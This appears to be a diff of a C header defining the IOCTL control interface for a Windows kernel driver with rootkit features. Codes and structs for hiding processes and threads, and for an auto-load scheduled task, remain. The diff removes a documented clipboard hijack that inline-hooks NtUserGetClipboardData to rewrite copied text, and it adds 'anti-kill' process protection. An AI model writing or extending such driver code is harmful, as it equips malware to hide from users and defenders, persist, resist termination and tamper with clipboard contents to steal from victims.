@@ -53,40 +53,17 @@ typedef LONG NTSTATUS;
 #define IOCTL_LIST_HIDDEN_THREADS                                              \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x905, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-//
-// Auto-load task control. Input TASK_REQUEST, output DRIVER_RESPONSE:
-//   Status = NTSTATUS of the operation, Data = 1 when the task is currently
-//   enabled. The task is managed wholly by the driver (auto-created at load).
-//
 #define IOCTL_TASK_CONTROL                                                     \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x906, METHOD_BUFFERED, FILE_ANY_ACCESS)
-//
-// Supplies the client's own Win32 image path to the driver so the auto-load
-// task can reference it directly ("C:\Users\...\Client.exe") instead of a
-// \Device\... NT path the scheduler refuses to launch. Input: UTF-16 string.
-//
 #define IOCTL_TASK_SET_IMAGE_PATH                                              \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x907, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-//
-// Clipboard hijack zone. The driver inline-hooks win32kfull!NtUserGetClipboardData
-// and, only for CF_UNICODETEXT reads, rewrites the clipboard section in place
-// before the caller locks it. Output of ARM/DISARM/STATUS is DRIVER_RESPONSE:
-//   Status = NTSTATUS, Data = 1 when the hook is currently armed.
-//
-#define IOCTL_CLIP_ARM                                                         \
+#define IOCTL_PROTECT_PROCESS                                                  \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x908, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLIP_DISARM                                                      \
+#define IOCTL_UNPROTECT_PROCESS                                                \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x909, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_CLIP_STATUS                                                      \
+#define IOCTL_LIST_PROTECTED_PROCESSES                                         \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x90A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-//
-// Sets the replacement UTF-16 text. Input: raw wide string, NUL-terminated in
-// the client's buffer. The driver caches up to CLIP_MAX_TEXT_CHARS wide chars
-// (256 bytes) in non-paged memory.
-//
-#define IOCTL_CLIP_SET_TEXT                                                    \
-  CTL_CODE(DRIVER_DEVICE_TYPE, 0x90B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
 //
 // Exchange data struct
 //
@@ -106,6 +83,9 @@ typedef struct _TASK_REQUEST {
 
 // Max number of threads tracked in the hidden registry.
 #define MAX_HIDDEN_THREADS 64
+
+// Max number of processes tracked in the anti-kill registry.
+#define MAX_PROTECTED_PROCESSES 64
 
 // Input of IOCTL_HIDE_PROCESS / IOCTL_UNHIDE_PROCESS.
 typedef struct _PROCESS_REQUEST {
@@ -129,11 +109,14 @@ typedef struct _THREAD_LIST_RESPONSE {
   ULONG ThreadIds[MAX_HIDDEN_THREADS];
 } THREAD_LIST_RESPONSE, *PTHREAD_LIST_RESPONSE;
 
+// Output of IOCTL_LIST_PROTECTED_PROCESSES.
+typedef struct _PROTECTED_PROCESS_LIST_RESPONSE {
+  ULONG Count;
+  ULONG ProcessIds[MAX_PROTECTED_PROCESSES];
+} PROTECTED_PROCESS_LIST_RESPONSE, *PPROTECTED_PROCESS_LIST_RESPONSE;
+
 // default response
 typedef struct _DRIVER_RESPONSE {
   NTSTATUS Status;
   ULONG Data;
 } DRIVER_RESPONSE, *PDRIVER_RESPONSE;
-
-// Max replacement text, in UTF-16 code units, including the terminator.
-#define CLIP_MAX_TEXT_CHARS 128
